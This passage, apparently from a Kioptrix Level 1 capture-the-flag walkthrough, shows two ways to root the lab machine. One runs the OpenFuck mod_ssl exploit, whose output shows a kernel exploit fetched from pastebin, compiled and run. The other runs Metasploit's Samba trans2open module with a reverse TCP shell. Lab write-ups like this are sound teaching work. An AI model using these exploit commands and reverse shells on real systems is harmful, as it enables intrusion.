        0x69 - RedHat Linux 7.1-Update (1.3.27-1.7.1)
        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
        0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
        0x6c - RedHat Linux 7.2-Update (apache-1.3.22-6)
        0x6d - RedHat Linux 7.2 (apache-1.3.24)
        0x6e - RedHat Linux 7.2 (apache-1.3.26)
        0x6f - RedHat Linux 7.2 (apache-1.3.26-snc)
        0x70 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)1
        0x71 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)2
        0x72 - RedHat Linux 7.2-Update (apache-1.3.27-1.7.2)
        0x73 - RedHat Linux 7.3 (apache-1.3.23-11)1
        0x74 - RedHat Linux 7.3 (apache-1.3.23-11)2
        0x75 - RedHat Linux 7.3 (apache-1.3.27)
        0x76 - RedHat Linux 8.0 (apache-1.3.27)
        0x77 - RedHat Linux 8.0-second (apache-1.3.27)
        0x78 - RedHat Linux 8.0 (apache-2.0.40)
        0x79 - Slackware Linux 4.0 (apache-1.3.6)
        0x7a - Slackware Linux 7.0 (apache-1.3.9)
        0x7b - Slackware Linux 7.0 (apache-1.3.26)
        0x7c - Slackware 7.0  (apache-1.3.26)2
        0x7d - Slackware Linux 7.1 (apache-1.3.12)
        0x7e - Slackware Linux 8.0 (apache-1.3.20)
        0x7f - Slackware Linux 8.1 (apache-1.3.24)
        0x80 - Slackware Linux 8.1 (apache-1.3.26)
        0x81 - Slackware Linux 8.1-stable (apache-1.3.26)
        0x82 - Slackware Linux (apache-1.3.27)
        0x83 - SuSE Linux 7.0 (apache-1.3.12)
        0x84 - SuSE Linux 7.1 (apache-1.3.17)
        0x85 - SuSE Linux 7.2 (apache-1.3.19)
        0x86 - SuSE Linux 7.3 (apache-1.3.20)
        0x87 - SuSE Linux 8.0 (apache-1.3.23)
        0x88 - SUSE Linux 8.0 (apache-1.3.23-120)
        0x89 - SuSE Linux 8.0 (apache-1.3.23-137)
        0x8a - Yellow Dog Linux/PPC 2.3 (apache-1.3.22-6.2.3a)

Fuck to all guys who like use lamah ddos. Read SRC to have no surprise

```
Bases on the Apache version it would be one of these options:
- 0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
- 0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2

Let's try the second option first.

```bash
┌──(emvee㉿kali)-[~/Documents/kioptrix/OpenFuck]
└─$ ./OpenFuck 0x6b $ip -c N

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80fc210
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
race-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; m/raw/C7v25Xr9 -O pt 
--14:25:38--  https://pastebin.com/raw/C7v25Xr9
           => `ptrace-kmod.c'
Connecting to pastebin.com:443... connected!
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/plain]

    0K ...                                                    @   3.84 MB/s

14:25:39 (3.84 MB/s) - `ptrace-kmod.c' saved [4026]

ptrace-kmod.c:183:1: warning: no newline at end of file
[+] Attached to 1267
[+] Waiting for signal
[+] Signal caught
[+] Shellcode placed at 0x4001189d
[+] Now wait for suid shell...
```
It does not show anything yet. We should try to find out who we are.
```
whoami
root
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
ls
p
pwd
/tmp
ls /root
anaconda-ks.cfg

```
This was an easy hack without the need for privilege escalation since we are root!
## Alternative SMB
This is an old and vulnerable machine. One of the services is SMB what could be exploited as well.
First we should try to enumerate the SMB shares to see if there is interesting information shared.
```bash
┌──(emvee㉿kali)-[~/Documents/kioptrix]
└─$ smbclient -L $ip
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
Password for [WORKGROUP\emvee]:

        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       IPC Service (Samba Server)
        ADMIN$          IPC       IPC Service (Samba Server)
Reconnecting with SMB1 for workgroup listing.
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful

        Server               Comment
        ---------            -------
        KIOPTRIX             Samba Server

        Workgroup            Master
        ---------            -------
        MYGROUP              KIOPTRIX

```
Since we don't know the SMB version we could user Metasploit to find the version. Let's start Metasploit without the awesome banner.
```bash
┌──(emvee㉿kali)-[~/Documents/kioptrix]
└─$ msfconsole -q 
msf6 > 

```
Next we should search for the `smb version module` with the search option.
```bash
msf6 > search smb version

Matching Modules
================

   #   Name                                                      Disclosure Date  Rank       Check  Description
   -   ----                                                      ---------------  ----       -----  -----------
   0   exploit/multi/http/struts_code_exec_classloader           2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   1   exploit/linux/misc/cisco_rv340_sslvpn                     2022-02-02       good       Yes    Cisco RV340 SSL VPN Unauthenticated Remote Code Execution
   2   exploit/windows/smb/ms08_067_netapi                       2008-10-28       great      Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
   3   exploit/windows/browser/ms10_022_ie_vbscript_winhlp32     2010-02-26       great      No     MS10-022 Microsoft Internet Explorer Winhlp32.exe MsgBox Code Execution
   4   exploit/windows/fileformat/ms14_060_sandworm              2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
   5   auxiliary/dos/windows/smb/rras_vls_null_deref             2006-06-14       normal     No     Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference
   6   auxiliary/dos/windows/smb/ms11_019_electbowser                             normal     No     Microsoft Windows Browser Pool DoS
   7   exploit/windows/smb/smb_rras_erraticgopher                2017-06-13       average    Yes    Microsoft Windows RRAS Service MIBEntryGet Overflow
   8   auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                   normal     No     Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS
   9   auxiliary/scanner/smb/smb_version                                          normal     No     SMB Version Detection
   10  exploit/linux/samba/chain_reply                           2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
   11  exploit/multi/ids/snort_dce_rpc                           2007-02-19       good       No     Snort 2 DCE/RPC Preprocessor Buffer Overflow
   12  exploit/windows/browser/java_ws_arginject_altjvm          2010-04-09       excellent  No     Sun Java Web Start Plugin Command Line Argument Injection
   13  exploit/windows/smb/timbuktu_plughntcommand_bof           2009-06-25       great      No     Timbuktu PlughNTCommand Named Pipe Buffer Overflow
   14  exploit/windows/fileformat/ursoft_w32dasm                 2005-01-24       good       No     URSoft W32Dasm Disassembler Function Buffer Overflow
   15  exploit/windows/fileformat/vlc_smb_uri                    2009-06-24       great      No     VideoLAN Client (VLC) Win32 smb:// URI Buffer Overflow


Interact with a module by name or index. For example info 15, use 15 or use exploit/windows/fileformat/vlc_smb_uri

msf6 > 

```
Now we are able to select the module by the command `use 9`.
```bash
msf6 > use 9
```
First we should check what options are available to us with the `option` command.
```bash
msf6 auxiliary(scanner/smb/smb_version) > options

Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit
                                       /basics/using-metasploit.html
   THREADS  1                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smb/smb_version) >
```
We need to set the IP address of the target with `set RHOSTS 10.0.2.4` and hit enter.
```bash
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 10.0.2.4
RHOSTS => 10.0.2.4

```
Now we can start the module to find the samba version.
```bash
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 10.0.2.4:139          - SMB Detected (versions:) (preferred dialect:) (signatures:optional)
[*] 10.0.2.4:139          -   Host could not be identified: Unix (Samba 2.2.1a)
[*] 10.0.2.4:             - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_version) > 

```
It looks like Samba 2.2.1a is used on this machine. This should be added to our notes. Next we should check if there are known exploits available. We can do this with searchsploit.
```bash
┌──(emvee㉿kali)-[~/Documents/kioptrix]
└─$ searchsploit samba 2.2.1        
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                    | osx/remote/9924.rb
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                               | multiple/remote/10.c
Samba < 3.0.20 - Remote Heap Overflow                                           | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                   | linux_x86/dos/36741.py
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```
It looks like there is an exploit `trans2open` available in Metasploit. Let's search for this exploit in Metasploit.

```bash
msf6 > search trans2open

Matching Modules
================

   #  Name                              Disclosure Date  Rank   Check  Description
   -  ----                              ---------------  ----   -----  -----------
   0  exploit/freebsd/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
   1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
   2  exploit/osx/samba/trans2open      2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
   3  exploit/solaris/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)


Interact with a module by name or index. For example info 3, use 3 or use exploit/solaris/samba/trans2open

msf6 > 

```
Now we should select the exploit.
```bash
msf6 > use 1
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/samba/trans2open) >
```
We should check the options of the exploit.
```bash
msf6 exploit(linux/samba/trans2open) > options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/
                                      basics/using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.5         yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce



View the full module info with the info, or info -d command.

msf6 exploit(linux/samba/trans2open) >
```
We have to set the `RHOSTS` again and select a payload so we can execute command in a shell.
```bash
msf6 exploit(linux/samba/trans2open) > set RHOSTS 10.0.2.4
RHOSTS => 10.0.2.4
msf6 exploit(linux/samba/trans2open) > set payload generic/shell_reverse_tcp
payload => generic/shell_reverse_tcp
msf6 exploit(linux/samba/trans2open) > 

```
After configuring all options we can start the exploit and gain root privileges.
```bash
msf6 exploit(linux/samba/trans2open) > run

[*] Started reverse TCP handler on 10.0.2.5:4444 
[*] 10.0.2.4:139 - Trying return address 0xbffffdfc...
[*] 10.0.2.4:139 - Trying return address 0xbffffcfc...
[*] 10.0.2.4:139 - Trying return address 0xbffffbfc...
[*] 10.0.2.4:139 - Trying return address 0xbffffafc...
[*] 10.0.2.4:139 - Trying return address 0xbffff9fc...
[*] 10.0.2.4:139 - Trying return address 0xbffff8fc...
[*] 10.0.2.4:139 - Trying return address 0xbffff7fc...
[*] 10.0.2.4:139 - Trying return address 0xbffff6fc...
[*] Command shell session 5 opened (10.0.2.5:4444 -> 10.0.2.4:32775) at 2023-12-20 16:38:20 +0100

[*] Command shell session 6 opened (10.0.2.5:4444 -> 10.0.2.4:32776) at 2023-12-20 16:38:22 +0100
[*] Command shell session 7 opened (10.0.2.5:4444 -> 10.0.2.4:32777) at 2023-12-20 16:38:23 +0100
[*] Command shell session 8 opened (10.0.2.5:4444 -> 10.0.2.4:32778) at 2023-12-20 16:38:24 +0100

id
uid=0(root) gid=0(root) groups=99(nobody)
whoami
root
hostname
kioptrix.level1

```